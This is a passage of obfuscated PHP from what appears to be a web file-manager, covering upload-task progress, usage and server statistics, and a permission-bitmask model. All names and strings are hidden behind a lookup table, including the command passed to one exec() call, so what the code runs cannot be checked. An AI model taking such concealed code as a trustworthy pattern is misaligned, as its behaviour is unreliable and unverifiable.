$óÁŞ¹Ôâ[1209]) { $Êç§ªŸÛ = 0; } $ƒõØú“ = ($¡’åÂ­ö[$óÁŞ¹Ôâ[1719]] + $Êç§ªŸÛ) / $¡’åÂ­ö[$óÁŞ¹Ôâ[780]]; $¡’åÂ­ö[$óÁŞ¹Ôâ[1668]] = $ƒõØú“ * 0.3; } else { if ($¡’åÂ­ö[$óÁŞ¹Ôâ[1758]] == $óÁŞ¹Ôâ[321]) { $ƒõØú“ = $¡’åÂ­ö[$óÁŞ¹Ôâ[1667]] / $¡’åÂ­ö[$óÁŞ¹Ôâ[803]]; $¡’åÂ­ö[$óÁŞ¹Ôâ[1668]] = 0.3 + $ƒõØú“ * 0.5; } else { if ($¡’åÂ­ö[$óÁŞ¹Ôâ[1758]] == $óÁŞ¹Ôâ[118]) { $ƒõØú“ = 0; if ($¡’åÂ­ö[$óÁŞ¹Ôâ[1714]]) { $ƒõØú“ = $¡’åÂ­ö[$óÁŞ¹Ôâ[1715]] / $¡’åÂ­ö[$óÁŞ¹Ôâ[1714]]; } $¡’åÂ­ö[$óÁŞ¹Ôâ[1668]] = 0.3 + 0.5 + $ƒõØú“ * 0.2; } } } if ($¡’åÂ­ö[$óÁŞ¹Ôâ[1668]] > 0) { $à·³Øù = timeFloat() - $¡’åÂ­ö[$óÁŞ¹Ôâ[1670]] - $¡’åÂ­ö[$óÁŞ¹Ôâ[1673]]; $¡’åÂ­ö[$óÁŞ¹Ôâ[1674]] = $à·³Øù * (1 - $¡’åÂ­ö[$óÁŞ¹Ôâ[1668]]) / $¡’åÂ­ö[$óÁŞ¹Ôâ[1668]]; } } public function copyFileStart($ËäàÛµ, $»ÕŞÑ±¿, $ÆÇ¤Ñà², $µü³´, $ûòÃ¡ç, $©¾‹ãÅ) { $ÚçæğÍ¤ =& $_SERVER[¯µç›È¢]; parent::copyFileStart($ËäàÛµ, $»ÕŞÑ±¿, $ÆÇ¤Ñà², $µü³´, $ûòÃ¡ç, $©¾‹ãÅ); $¸–“‘è¼ =& $this->task; if ($¸–“‘è¼[$ÚçæğÍ¤[1758]] == $ÚçæğÍ¤[321]) { $¸–“‘è¼[$ÚçæğÍ¤[1758]] = $ÚçæğÍ¤[118]; } $this->update(); } public function copyFileEnd($¥Æé–ù, $­ú­÷Ú, $úà¿ùÇ, $Ÿ¼èó®™, $ªô€¦ˆü, $ëÑôöÀ¯) { $×óƒ†åØ =& $_SERVER[¯µç›È¢]; $…ß“â·¹ =& $this->task; $…ß“â·¹[$×óƒ†åØ[1715]] = $…ß“â·¹[$×óƒ†åØ[1714]]; $…ß“â·¹[$×óƒ†åØ[1719]] += $…ß“â·¹[$×óƒ†åØ[1714]]; $…ß“â·¹[$×óƒ†åØ[1716]] = $×óƒ†åØ[12]; $this->update(); } public function nameParse($İ™‘­ê) { $Ëô†Ï¬ =& $_SERVER[¯µç›È¢]; $˜í†¸ œ =& $this->task; if ($˜í†¸ œ[$Ëô†Ï¬[1667]] < $˜í†¸ œ[$Ëô†Ï¬[803]]) { $úÉ•ËŸÁ = get_path_this($İ™‘­ê); if (strstr($úÉ•ËŸÁ, $Ëô†Ï¬[10])) { $˜í†¸ œ[$Ëô†Ï¬[1667]] += 1; } } if ($˜í†¸ œ[$Ëô†Ï¬[1758]] == $Ëô†Ï¬[1209]) { $˜í†¸ œ[$Ëô†Ï¬[1758]] = $Ëô†Ï¬[321]; } $˜í†¸ œ[$Ëô†Ï¬[1712]] = $İ™‘­ê; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($éÊ²Ç) { $ÏÏ–Ñ³Ù =& $_SERVER[¯µç›È¢]; $¥Œ‹š¢“ = array($ÏÏ–Ñ³Ù[602] => array($ÏÏ–Ñ³Ù[33] => $ÏÏ–Ñ³Ù[1763], $ÏÏ–Ñ³Ù[281] => array($ÏÏ–Ñ³Ù[233], $ÏÏ–Ñ³Ù[782], $ÏÏ–Ñ³Ù[1764], $ÏÏ–Ñ³Ù[1765])), $ÏÏ–Ñ³Ù[1766] => array($ÏÏ–Ñ³Ù[33] => $ÏÏ–Ñ³Ù[1767], $ÏÏ–Ñ³Ù[281] => array($ÏÏ–Ñ³Ù[233], $ÏÏ–Ñ³Ù[780], $ÏÏ–Ñ³Ù[1768], $ÏÏ–Ñ³Ù[1769], $ÏÏ–Ñ³Ù[1770]))); if (!isset($¥Œ‹š¢“[$éÊ²Ç])) { return !1; } $this->optionType = $¥Œ‹š¢“[$éÊ²Ç][$ÏÏ–Ñ³Ù[33]]; $this->field = $¥Œ‹š¢“[$éÊ²Ç][$ÏÏ–Ñ³Ù[281]]; return !0; } public function listData($…ÎÔ“¶ = false, $ï¶ ÷¾Â = "\155\x6f\144\151\x66\171\124\x69\x6d\x65", $ïÌ«‚ÀÁ = false) { return parent::listData($…ÎÔ“¶, $ï¶ ÷¾Â, $ïÌ«‚ÀÁ); } public function trendList($øÊ¸Â‡ä) { $¢µ”…Çœ =& $_SERVER[¯µç›È¢]; $÷Ì˜ûÊø = $this->listData(); if ($÷Ì˜ûÊø) { $»ó‡áşÔ = end($÷Ì˜ûÊø); $ƒòÌ×¯— = date($¢µ”…Çœ[1771], strtotime($¢µ”…Çœ[1772])); if ($»ó‡áşÔ[$¢µ”…Çœ[233]] == $ƒòÌ×¯—) { return $÷Ì˜ûÊø; } $åì—À¦— = strtotime($»ó‡áşÔ[$¢µ”…Çœ[233]]); } if (!isset($åì—À¦—)) { $éÙˆêŞ® = $øÊ¸Â‡ä == $¢µ”…Çœ[602] ? $¢µ”…Çœ[546] : $¢µ”…Çœ[842]; $åì—À¦— = Model($éÙˆêŞ®)->min($¢µ”…Çœ[207]); } $×’Š±¾Ş = $¢µ”…Çœ[1773] . ucfirst($øÊ¸Â‡ä); $­ÀÑğÂş = $this->dateList($åì—À¦—); foreach ($­ÀÑğÂş as $ƒòÌ×¯—) { $this->{$×’Š±¾Ş}($ƒòÌ×¯—); } return $this->listData(); } private function dateList($ü—ëñ÷Ä) { $é‡™œ¯ =& $_SERVER[¯µç›È¢]; $º®†àá² = $ü—ëñ÷Ä; $½¸áÊ™ = strtotime($é‡™œ¯[1772]); $÷³«™˜î = array(); while ($º®†àá² <= $½¸áÊ™) { $÷³«™˜î[] = date($é‡™œ¯[1771], $º®†àá²); $º®†àá² = strtotime($é‡™œ¯[1774], $º®†àá²); } return $÷³«™˜î; } public function _recordUser($‘â£»üù = '') { $¶™÷¬èú =& $_SERVER[¯µç›È¢]; $öÈ™¥ú = strtotime(date($¶™÷¬èú[1775], strtotime($‘â£»üù))); $Ú˜éğí = strtotime(date($¶™÷¬èú[1776], strtotime($‘â£»üù))); $¤½†Ï÷‚ = array($¶™÷¬èú[207] => array($¶™÷¬èú[1025], $Ú˜éğí)); $é‡”ÛÒ¤ = Model($¶™÷¬èú[546])->where($¤½†Ï÷‚)->count($¶™÷¬èú[1666]); $¤½†Ï÷‚[$¶™÷¬èú[207]] = array($¶™÷¬èú[341], array($öÈ™¥ú, $Ú˜éğí)); $õ£Éèöô = Model($¶™÷¬èú[546])->where($¤½†Ï÷‚)->count($¶™÷¬èú[1666]); $¤½†Ï÷‚[$¶™÷¬èú[33]] = $¶™÷¬èú[1777]; $Ë‹—ÔÎõ = Model($¶™÷¬èú[1778])->where($¤½†Ï÷‚)->count($¶™÷¬èú[1779]); $‡¹»Ú³² = array($¶™÷¬èú[233] => $‘â£»üù, $¶™÷¬èú[782] => (int) $é‡”ÛÒ¤, $¶™÷¬èú[1764] => (int) $õ£Éèöô, $¶™÷¬èú[1765] => (int) $Ë‹—ÔÎõ); return $this->insert($‡¹»Ú³²); } public function _recordStore($­†¦”ÉÇ = '') { $ÊŸñ£Éì =& $_SERVER[¯µç›È¢]; $ô›Ö¬ô– = strtotime(date($ÊŸñ£Éì[1776], strtotime($­†¦”ÉÇ))); $±âĞ©¦ = array($ÊŸñ£Éì[207] => array($ÊŸñ£Éì[1025], $ô›Ö¬ô–)); $ã¯„­ù = Model($ÊŸñ£Éì[475])->where($±âĞ©¦)->sum($ÊŸñ£Éì[90]); $±âĞ©¦[$ÊŸñ£Éì[416]] = 0; $Ó°òêÁ• = Model($ÊŸñ£Éì[842])->where($±âĞ©¦)->sum($ÊŸñ£Éì[90]); $±âĞ©¦[$ÊŸñ£Éì[417]] = 1; $ÒäÛÌıı = Model($ÊŸñ£Éì[842])->where($±âĞ©¦)->sum($ÊŸñ£Éì[90]); $±âĞ©¦[$ÊŸñ£Éì[417]] = 2; $ùÒÃÒÑì = Model($ÊŸñ£Éì[842])->where($±âĞ©¦)->sum($ÊŸñ£Éì[90]); $Ó‰îÚôê = array($ÊŸñ£Éì[233] => $­†¦”ÉÇ, $ÊŸñ£Éì[780] => (int) $Ó°òêÁ•, $ÊŸñ£Éì[1768] => (int) $ã¯„­ù, $ÊŸñ£Éì[1769] => (int) $ÒäÛÌıı, $ÊŸñ£Éì[1770] => (int) $ùÒÃÒÑì); return $this->insert($Ó‰îÚôê); } public function trend($š„Âª‰ˆ, $ÑÚ ŒŒ²) { $ë”ÓÇö‚ =& $_SERVER[¯µç›È¢]; if (!$this->init($š„Âª‰ˆ)) { return !1; } $Ğ¾¦îÑº = $this->trendList($š„Âª‰ˆ); if ($Ğ¾¦îÑº && $ÑÚ ŒŒ² != $ë”ÓÇö‚[1639]) { $©»ÑĞÆü = $Ğ¾¦îÑº[0][$ë”ÓÇö‚[233]]; $¤«ƒ•îõ = $this->validDate($ÑÚ ŒŒ², $©»ÑĞÆü); $ö–Ëí™± = array(); $ïÆÛ§„Ø = array_to_keyvalue($Ğ¾¦îÑº, $ë”ÓÇö‚[233]); foreach ($¤«ƒ•îõ as $¦‡çÀ¢„) { if (isset($ïÆÛ§„Ø[$¦‡çÀ¢„])) { $Üó«¿§ú = $ïÆÛ§„Ø[$¦‡çÀ¢„]; } else { $Üó«¿§ú = end($Ğ¾¦îÑº); $Üó«¿§ú[$ë”ÓÇö‚[233]] = $¦‡çÀ¢„; if ($š„Âª‰ˆ == $ë”ÓÇö‚[602]) { $Üó«¿§ú[$ë”ÓÇö‚[1764]] = $Üó«¿§ú[$ë”ÓÇö‚[1765]] = 0; } } $ö–Ëí™±[] = $Üó«¿§ú; } $Ğ¾¦îÑº = $ö–Ëí™±; } $¾Ğ÷Õ¢± = array($ë”ÓÇö‚[602] => array($ë”ÓÇö‚[782] => LNG($ë”ÓÇö‚[1780]), $ë”ÓÇö‚[1764] => LNG($ë”ÓÇö‚[1781]), $ë”ÓÇö‚[1765] => LNG($ë”ÓÇö‚[1782])), $ë”ÓÇö‚[1766] => array($ë”ÓÇö‚[780] => LNG($ë”ÓÇö‚[1783]), $ë”ÓÇö‚[1768] => LNG($ë”ÓÇö‚[1784]), $ë”ÓÇö‚[1769] => LNG($ë”ÓÇö‚[1785]), $ë”ÓÇö‚[1770] => LNG($ë”ÓÇö‚[1786]))); $Œƒ¤‡÷è = array($ë”ÓÇö‚[602] => $ë”ÓÇö‚[1787], $ë”ÓÇö‚[1766] => $ë”ÓÇö‚[90]); if (empty($Ğ¾¦îÑº)) { $¦‡çÀ¢„ = date($ë”ÓÇö‚[1771], strtotime($ë”ÓÇö‚[1772])); $´êÉ€µô = array($ë”ÓÇö‚[233] => $¦‡çÀ¢„); foreach ($¾Ğ÷Õ¢±[$š„Âª‰ˆ] as $›¾ÎÁÔ® => $†õû‘¡‰) { $´êÉ€µô[$›¾ÎÁÔ®] = 0; } $Ğ¾¦îÑº[] = $´êÉ€µô; } $²Ö›‹û = array(); foreach ($Ğ¾¦îÑº as $†õû‘¡‰) { if ($š„Âª‰ˆ == $ë”ÓÇö‚[1766] && $†õû‘¡‰[$ë”ÓÇö‚[1768]] > $†õû‘¡‰[$ë”ÓÇö‚[780]]) { $†õû‘¡‰[$ë”ÓÇö‚[1768]] = $†õû‘¡‰[$ë”ÓÇö‚[780]]; } foreach ($¾Ğ÷Õ¢±[$š„Âª‰ˆ] as $›¾ÎÁÔ® => $ÉÏùØ•§) { $Üó«¿§ú = array($ë”ÓÇö‚[233] => $†õû‘¡‰[$ë”ÓÇö‚[233]], $ë”ÓÇö‚[1566] => $ÉÏùØ•§); $Üó«¿§ú[$Œƒ¤‡÷è[$š„Âª‰ˆ]] = isset($†õû‘¡‰[$›¾ÎÁÔ®]) ? $†õû‘¡‰[$›¾ÎÁÔ®] : 0; $²Ö›‹û[] = $Üó«¿§ú; } } return $²Ö›‹û; } public function validDate($ïÃ®Äã›, $ÁôÖ‡«¥) { $óöÎµÔĞ =& $_SERVER[¯µç›È¢]; $Ê²ïÙÓ = date($óöÎµÔĞ[1771], strtotime($óöÎµÔĞ[1772])); $› ³ş˜Â = array($Ê²ïÙÓ); switch ($ïÃ®Äã›) { case $óöÎµÔĞ[1646]: $Ìî™µú = mktime(0, 0, 0, date($óöÎµÔĞ[1788]), date($óöÎµÔĞ[1385]) - date($óöÎµÔĞ[1448]) + 7 - 7, date($óöÎµÔĞ[1789])); $ç¼…Äæ© = 0; do { $ä²°·€¦ = date($óöÎµÔĞ[1771], $Ìî™µú - 3600 * 24 * 7 * $ç¼…Äæ©); $› ³ş˜Â[] = $ä²°·€¦; $ç¼…Äæ©++; } while ($ÁôÖ‡«¥ < $ä²°·€¦); break; case $óöÎµÔĞ[1644]: $ç¼…Äæ© = 1; do { $½±ôÕùÂ = date($óöÎµÔĞ[1790], strtotime("\55\x20{$ç¼…Äæ©}\x20\x6d\x6f\x6e\x74\x68\163")); $› ³ş˜Â[] = $½±ôÕùÂ; $ç¼…Äæ©++; } while ($ÁôÖ‡«¥ < $½±ôÕùÂ); break; case $óöÎµÔĞ[1791]: $“­åÂ¥Ü = (int) date($óöÎµÔĞ[1789], strtotime($ÁôÖ‡«¥)); $Á•³ØÇÍ = (int) date($óöÎµÔĞ[1789]); if ($“­åÂ¥Ü >= $Á•³ØÇÍ) { break; } for ($“­åÂ¥Ü; $“­åÂ¥Ü < $Á•³ØÇÍ; $“­åÂ¥Ü++) { $› ³ş˜Â[] = $“­åÂ¥Ü . $óöÎµÔĞ[1792]; } break; default: break; } if ($ÁôÖ‡«¥ > end($› ³ş˜Â)) { array_pop($› ³ş˜Â); } sort($› ³ş˜Â); return $› ³ş˜Â; } public function listTable($¾İ¾ŸÄ) { $¬İ´‚å» = ucfirst($¾İ¾ŸÄ); return Model($¬İ´‚å»)->listData(); } public function option($˜İˆÅŒ–) { $ğ’ïÒâã = $_SERVER[¯µç›È¢][1793] . ucfirst($˜İˆÅŒ–); return $this->{$ğ’ïÒâã}(); } private function optionUser() { $øƒ®æÍ =& $_SERVER[¯µç›È¢]; $Å«øœªÉ = Model($øƒ®æÍ[546])->count($øƒ®æÍ[1666]); $ô‘Ü¤â¦ = Model($øƒ®æÍ[546])->where($øƒ®æÍ[1794])->count($øƒ®æÍ[1666]); $ï×¤€˜ = intval($GLOBALS[$øƒ®æÍ[6]][$øƒ®æÍ[357]][$øƒ®æÍ[1622]]) / 3600; $ìı¸ûé‘ = strtotime("\x2d{$ï×¤€˜}\40\150\157\165\x72\x73"); $¤ÈÓò¯„ = strtotime(date($øƒ®æÍ[1775])); if ($ìı¸ûé‘ < $¤ÈÓò¯„) { $ìı¸ûé‘ = $¤ÈÓò¯„; } $ë¾€œÂ = array($øƒ®æÍ[1795] => array($øƒ®æÍ[1026], $ìı¸ûé‘)); $’áşã = (int) Model($øƒ®æÍ[546])->where($ë¾€œÂ)->count($øƒ®æÍ[1666]); if (!$’áşã) { $’áşã = 1; } $ë¾€œÂ = array($øƒ®æÍ[1795] => array($øƒ®æÍ[1026], $¤ÈÓò¯„)); $ûõšÆ–Æ = Model($øƒ®æÍ[546])->where($ë¾€œÂ)->count($øƒ®æÍ[1666]); return array($øƒ®æÍ[776] => (int) $Å«øœªÉ, $øƒ®æÍ[1796] => (int) ($Å«øœªÉ - $ô‘Ü¤â¦), $øƒ®æÍ[1797] => (int) $ô‘Ü¤â¦, $øƒ®æÍ[1798] => (int) $ûõšÆ–Æ, $øƒ®æÍ[1799] => $’áşã); } private function optionFile() { $†êÈ•ÂŸ =& $_SERVER[¯µç›È¢]; $¤×÷«” = $this->sourceSize(); $ê»øî¿ = $¤×÷«”[$†êÈ•ÂŸ[90]]; $Ëâ–°¡” = $¤×÷«”[$†êÈ•ÂŸ[1768]]; $Õº×éÁ = Model($†êÈ•ÂŸ[842])->where(array($†êÈ•ÂŸ[416] => 0))->count($†êÈ•ÂŸ[408]); $’¯Ú¨»¡ = array($†êÈ•ÂŸ[416] => 0, $†êÈ•ÂŸ[207] => array($†êÈ•ÂŸ[1026], strtotime(date($†êÈ•ÂŸ[1775])))); $½Î¸¥˜ = Model($†êÈ•ÂŸ[842])->where($’¯Ú¨»¡)->sum($†êÈ•ÂŸ[90]); $Ä¢ÙôÆÃ = Model($†êÈ•ÂŸ[842])->where($’¯Ú¨»¡)->count($†êÈ•ÂŸ[408]); return array($†êÈ•ÂŸ[780] => $ê»øî¿, $†êÈ•ÂŸ[1768] => $Ëâ–°¡”, $†êÈ•ÂŸ[1800] => $ê»øî¿ - $Ëâ–°¡”, $†êÈ•ÂŸ[1801] => (int) $½Î¸¥˜, $†êÈ•ÂŸ[782] => (int) $Õº×éÁ, $†êÈ•ÂŸ[1802] => (int) $Ä¢ÙôÆÃ); } private function optionAccess() { $Õ‰Íæˆ­ =& $_SERVER[¯µç›È¢]; return array($Õ‰Íæˆ­[776] => $this->typeLogCnt(), $Õ‰Íæˆ­[118] => $this->typeLogCnt($Õ‰Íæˆ­[118]), $Õ‰Íæˆ­[455] => $this->typeLogCnt($Õ‰Íæˆ­[455]), $Õ‰Íæˆ­[1803] => $this->typeLogCnt($Õ‰Íæˆ­[1803]), $Õ‰Íæˆ­[1804] => $this->typeLogCnt($Õ‰Íæˆ­[1804]), $Õ‰Íæˆ­[602] => $this->typeLogCnt($Õ‰Íæˆ­[12], $Õ‰Íæˆ­[1779])); } private function typeLogCnt($»î¸™ ‹ = '', $×Ôüå‘‹ = "\x69\144") { $¾íœÚÛ =& $_SERVER[¯µç›È¢]; $–Ò¾àÚ¢ = array($¾íœÚÛ[118] => array($¾íœÚÛ[1805], $¾íœÚÛ[1806]), $¾íœÚÛ[455] => array($¾íœÚÛ[1807], $¾íœÚÛ[1808]), $¾íœÚÛ[1803] => array($¾íœÚÛ[1809], $¾íœÚÛ[1810], $¾íœÚÛ[1811]), $¾íœÚÛ[1804] => array($¾íœÚÛ[1812], $¾íœÚÛ[1813]), $¾íœÚÛ[1814] => array($¾íœÚÛ[1815], $¾íœÚÛ[1816], $¾íœÚÛ[1817])); $«ßõŞ» = strtotime(date($¾íœÚÛ[1775])); $Ú´¾“Ò¨ = array($¾íœÚÛ[207] => array($¾íœÚÛ[1026], $«ßõŞ»)); if ($»î¸™ ‹) { $Ú´¾“Ò¨[$¾íœÚÛ[33]] = array($¾íœÚÛ[7], $–Ò¾àÚ¢[$»î¸™ ‹]); } $Â“¬¡¤‰ = Model($¾íœÚÛ[1778])->where($Ú´¾“Ò¨)->count($×Ôüå‘‹); return (int) $Â“¬¡¤‰; } private function optionServer() { $ù¬ĞÓ =& $_SERVER[¯µç›È¢]; $å×ğ”Ë‘ = $this->diskDriver(); $Œ¨šÒÛ¥ = KodIO::defaultDriver(); $œ€ÅÜë = array($ù¬ĞÓ[834] => $Œ¨šÒÛ¥[$ù¬ĞÓ[405]]); $ÈâÀ‹‘‹ = Model($ù¬ĞÓ[475])->where($œ€ÅÜë)->sum($ù¬ĞÓ[90]); $õ›¬âÖ¥ = explode($ù¬ĞÓ[53], $_SERVER[$ù¬ĞÓ[154]]); $Ã«Ö€ = $õ›¬âÖ¥[0]; $«Ó‰£µ‚ = $GLOBALS[$ù¬ĞÓ[6]][$ù¬ĞÓ[21]]; $€À³ƒ‹ = $«Ó‰£µ‚[$ù¬ĞÓ[988]]; if ($€À³ƒ‹ == $ù¬ĞÓ[976]) { $•ªÌ¤™¦ = explode($ù¬ĞÓ[1282], $«Ó‰£µ‚[$ù¬ĞÓ[987]]); $€À³ƒ‹ = $•ªÌ¤™¦[0]; } if ($€À³ƒ‹ == $ù¬ĞÓ[924] || $€À³ƒ‹ == $ù¬ĞÓ[821]) { $òî ¡ìá = Model()->db()->query($ù¬ĞÓ[1818]); $úöš › = $òî ¡ìá[0] && isset($òî ¡ìá[0][$ù¬ĞÓ[1565]]) ? $òî ¡ìá[0][$ù¬ĞÓ[1565]] : 0; $€À³ƒ‹ = $ù¬ĞÓ[1819] . ($úöš › ? $ù¬ĞÓ[8] . $úöš › : $ù¬ĞÓ[12]); } $Ğ³ùÇë = $GLOBALS[$ù¬ĞÓ[6]][$ù¬ĞÓ[357]][$ù¬ĞÓ[844]]; return array($ù¬ĞÓ[1820] => $å×ğ”Ë‘ ? $å×ğ”Ë‘[$ù¬ĞÓ[1821]] : 0, $ù¬ĞÓ[1822] => $å×ğ”Ë‘ ? $å×ğ”Ë‘[$ù¬ĞÓ[1823]] : 0, $ù¬ĞÓ[1824] => (int) $Œ¨šÒÛ¥[$ù¬ĞÓ[1821]] * 1024 * 1024 * 1024, $ù¬ĞÓ[1825] => (int) $ÈâÀ‹‘‹, $ù¬ĞÓ[1826] => ucfirst($Ã«Ö€), $ù¬ĞÓ[1827] => $ù¬ĞÓ[1828] . PHP_VERSION, $ù¬ĞÓ[1829] => phpBuild64() ? 64 : 32, $ù¬ĞÓ[775] => str_replace($ù¬ĞÓ[1142], $ù¬ĞÓ[1004], $€À³ƒ‹), $ù¬ĞÓ[357] => ucfirst($Ğ³ùÇë), $ù¬ĞÓ[32] => $_SERVER[$ù¬ĞÓ[1830]]); } private function diskDriver() { $ôˆë­÷Æ =& $_SERVER[¯µç›È¢]; $ï‘›»…Ä = $ôˆë­÷Æ[8]; $®¡Ş¢¿½ = $GLOBALS[$ôˆë­÷Æ[6]][$ôˆë­÷Æ[1298]] == $ôˆë­÷Æ[1299]; if ($®¡Ş¢¿½) { $ï‘›»…Ä = $ôˆë­÷Æ[1831]; if (function_exists($ôˆë­÷Æ[1832])) { exec($ôˆë­÷Æ[1833], $Çä’û’); $ï‘›»…Ä = $Çä’û’[1] . $ôˆë­÷Æ[8]; } } if (!file_exists($ï‘›»…Ä)) { return; } $ÏŞ¦÷ªÚ = @disk_total_space($ï‘›»…Ä); $©Ÿƒš±â = $ÏŞ¦÷ªÚ - @disk_free_space($ï‘›»…Ä); return array($ôˆë­÷Æ[1821] => $ÏŞ¦÷ªÚ, $ôˆë­÷Æ[1823] => $©Ÿƒš±â); } public function fileChart($¦¾«éëÕ) { $ŸãÖ¿– =& $_SERVER[¯µç›È¢]; if (isset($¦¾«éëÕ[$ŸãÖ¿–[1666]])) { return Model($ŸãÖ¿–[842])->userFileTypeProfile($¦¾«éëÕ[$ŸãÖ¿–[1666]]); } if (isset($¦¾«éëÕ[$ŸãÖ¿–[1834]])) { return Model($ŸãÖ¿–[842])->groupFileTypeProfile($¦¾«éëÕ[$ŸãÖ¿–[1834]]); } $£óÁĞ = $this->sourceSize(); $˜ûî‘˜ü = array($ŸãÖ¿–[503] => 0, $ŸãÖ¿–[417] => 1); $–ıÚ äŠ = Model($ŸãÖ¿–[842])->where($˜ûî‘˜ü)->sum($ŸãÖ¿–[90]); $˜ûî‘˜ü[$ŸãÖ¿–[417]] = 2; $—Öúòş = Model($ŸãÖ¿–[842])->where($˜ûî‘˜ü)->sum($ŸãÖ¿–[90]); return array($ŸãÖ¿–[780] => $£óÁĞ[$ŸãÖ¿–[90]], $ŸãÖ¿–[1768] => $£óÁĞ[$ŸãÖ¿–[1768]], $ŸãÖ¿–[1769] => (int) $–ıÚ äŠ, $ŸãÖ¿–[1770] => (int) $—Öúòş); } private function sourceSize() { $›’ëæ¥ =& $_SERVER[¯µç›È¢]; $ì£•âÑ¢ = Model($›’ëæ¥[842])->where(array($›’ëæ¥[416] => 0))->sum($›’ëæ¥[90]); $¯Ë¦¨‚¹ = Model($›’ëæ¥[475])->sum($›’ëæ¥[90]); if ($¯Ë¦¨‚¹ > $ì£•âÑ¢) { $¯Ë¦¨‚¹ = $ì£•âÑ¢; } return array($›’ëæ¥[90] => (int) $ì£•âÑ¢, $›’ëæ¥[1768] => (int) $¯Ë¦¨‚¹); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $»œĞ¤†ì =& $_SERVER[¯µç›È¢]; $ Œ²ã´ô = array(array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1835]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1837], $»œĞ¤†ì[1838] => 1, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1841]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1842], $»œĞ¤†ì[1838] => 2, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1843]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1844], $»œĞ¤†ì[1838] => 3, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1845]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1846], $»œĞ¤†ì[1838] => 4, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => self::AUTH_SHOW | self::AUTH_VIEW), array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1847]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1848], $»œĞ¤†ì[1838] => 5, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1849]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1850], $»œĞ¤†ì[1838] => 6, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($»œĞ¤†ì[426] => LNG($»œĞ¤†ì[1851]), $»œĞ¤†ì[1836] => $»œĞ¤†ì[1852], $»œĞ¤†ì[1838] => 7, $»œĞ¤†ì[1839] => 1, $»œĞ¤†ì[1840] => 0)); return $ Œ²ã´ô; } public static function authCheck($‹¼ÆÜª¨, $ªÇÛ±î•) { $‹¼ÆÜª¨ = intval($‹¼ÆÜª¨); if ($GLOBALS[$_SERVER[¯µç›È¢][508]]) { return !0; } if ($‹¼ÆÜª¨ <= 0) { return !1; } if (($‹¼ÆÜª¨ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‹¼ÆÜª¨ & $ªÇÛ±î•); } public static function authCheckShow($±ßùÕı») { return self::authCheck($±ßùÕı», self::AUTH_SHOW); } public static function authCheckView($–üâ±øı) { return self::authCheck($–üâ±øı, self::AUTH_VIEW); } public static function authCheckDownload($¾’ª¦Ê¼) { return self::authCheck($¾’ª¦Ê¼, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ëÓÏ€ŞÎ) { return self::authCheck($ëÓÏ€ŞÎ, self::AUTH_UPLOAD); } public static function authCheckEdit($‚ëéÒãë) { return self::authCheck($‚ëéÒãë, self::AUTH_EDIT); } public static function authCheckRemove($“±¸‡¾») { return self::authCheck($“±¸‡¾», self::AUTH_REMOVE); } public static function authCheckShare($ÅòÜí¢˜) { return self::authCheck($ÅòÜí¢˜, self::AUTH_SHARE); } public static function authCheckComment($î¢­ÑØö) { return self::authCheck($î¢­ÑØö, self::AUTH_COMMENT); } public static function authCheckEvent($·Ô¥—¯) { return self::authCheck($·Ô¥—¯, self::AUTH_EVENT); } public static function authCheckRoot($âÃèÆ×é) { return self::authCheck($âÃèÆ×é, self::AUTH_ROOT); } public static function authCheckAction($úá®®×Ğ, $‰Öİ“ëâ) { $â÷ª¾¤ =& $_SERVER[¯µç›È¢]; $´à®€› = array($â÷ª¾¤[1853] => self::AUTH_VIEW, $â÷ª¾¤[1209] => self::AUTH_DOWNLOAD, $â÷ª¾¤[118] => self::AUTH_UPLOAD, $â÷ª¾¤[1804] => self::AUTH_EDIT, $â÷ª¾¤[1803] => self::AUTH_REMOVE, $â÷ª¾¤[1814] => self::AUTH_SHARE, $â÷ª¾¤[362] => self::AUTH_COMMENT, $â÷ª¾¤[1654] => self::AUTH_EVENT, $â÷ª¾¤[1854] => self::AUTH_ROOT); if (!isset($´à®€›[$‰Öİ“ëâ])) { return; } $Ş¼ßèº€ = 